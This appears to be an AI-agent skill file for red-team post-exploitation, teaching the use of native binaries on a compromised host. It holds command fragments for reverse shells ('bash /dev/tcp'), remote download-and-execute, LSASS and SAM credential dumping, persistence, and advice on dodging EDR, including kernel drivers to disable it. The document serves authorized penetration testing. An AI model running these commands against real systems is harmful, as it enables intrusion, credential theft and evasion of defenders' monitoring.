---
name: living-off-the-land
description: Use when operating on a compromised host and you want to use NATIVE / already-installed / signed binaries instead of dropping your own tools — for recon, download/exec, privilege escalation, persistence, or exfil. Backed by GTFOBins (Linux), LOLBAS (Windows), LOLDrivers (BYOVD). Authorized engagements only.
metadata:
  type: offensive
  phase: post-exploitation
  tools: GTFOBins, LOLBAS, LOLDrivers, WADComs
---

# Living Off The Land (LOLBins / GTFOBins)

Once you have a foothold, prefer binaries **already on the host** over dropping tooling: nothing to
upload, signed/expected binaries blend into the baseline, and many bypass naive allow-lists. The
canonical references are **GTFOBins** (Linux), **LOLBAS** (Windows), **LOLDrivers** (vulnerable
signed drivers), and **WADComs** (Windows/AD). This skill is how to reason about them, not a dump.

## First: check what's watched
LOLBin *abuse* is exactly what mature EDR hunts (certutil download, rundll32 with odd args, `bash -i`
from a service account). Enum logging/EDR before you lean on these (see edr-evasion); a signed binary
run in an un-signed way still generates a detection opportunity. Prefer the quietest option that works.

## Linux — GTFOBins patterns
Pivot on **what the binary lets you do** given your context (plain exec, `sudo`, SUID, or a
`capability`):
- **Shell / breakout**: from a restricted shell or a `sudo`/SUID binary — `vim`, `less`, `awk`,
  `find -exec`, `nmap --interactive`, `tar --checkpoint-action`, `env`, `perl`, `python`.
- **Privilege escalation**: `sudo <gtfobin>` or SUID `<gtfobin>` → root shell / file read as root.
  Always run `sudo -l` and `find / -perm -4000` first, then map hits to GTFOBins.
- **File read/write as root**: `cat`/`cp`/`dd`/`tee` variants when SUID/sudo-allowed.
- **Download / exec**: `curl`, `wget`, `python -c`, `perl`, `php`, `bash /dev/tcp/<ip>/<port>` for
  egress/reverse shells.
- **Capabilities**: `getcap -r / 2>/dev/null` → `cap_setuid`/`cap_dac_read_search` on python/perl/tar
  = privesc. Cross-ref privesc-linux.

## Windows — LOLBAS patterns
Signed Microsoft binaries abused by tactic:
- **Download**: `certutil -urlcache -f`, `bitsadmin /transfer`, `curl.exe`, `msiexec /q /i http://…`.
- **Execute**: `mshta`, `rundll32`, `regsvr32 /s /u /i:http://… scrobj.dll`, `wmic process call
  create`, `InstallUtil`, `MSBuild` (inline C#), `cmstp`.
- **Credential / dump**: `comsvcs.dll MiniDump` for LSASS (loud — EDR flags it), `reg save hklm\sam`.
- **Persistence**: scheduled tasks (`schtasks`), services (`sc`), run keys, WMI event subs —
  reversible + logged (cross-ref red-team-ops, privesc-windows).
- **Recon**: `whoami /all`, `net`/`net1`, `nltest`, `dsquery`, `systeminfo`, `tasklist /svc`.

## BYOVD (LOLDrivers) — careful, documented-only
A vulnerable **signed** driver can disable EDR / gain kernel primitives. This is high-risk: it can
destabilize the host. Only with explicit RoE, document the driver + action, and never on a system
you cannot safely restore. Prefer non-kernel options first.

## OPSEC & discipline
- Use LOLBins to **avoid dropping tools**, not as a license to be loud — each one is a known
  detection. Prefer native recon (`net`, `whoami`) before anything that touches LSASS or kernel.
- Everything reversible and logged; no destructive binary use (no `rm -rf`, no disk wipe, no
  ransomware-style action). Prove the capability, don't cause harm. Authorized scope only.
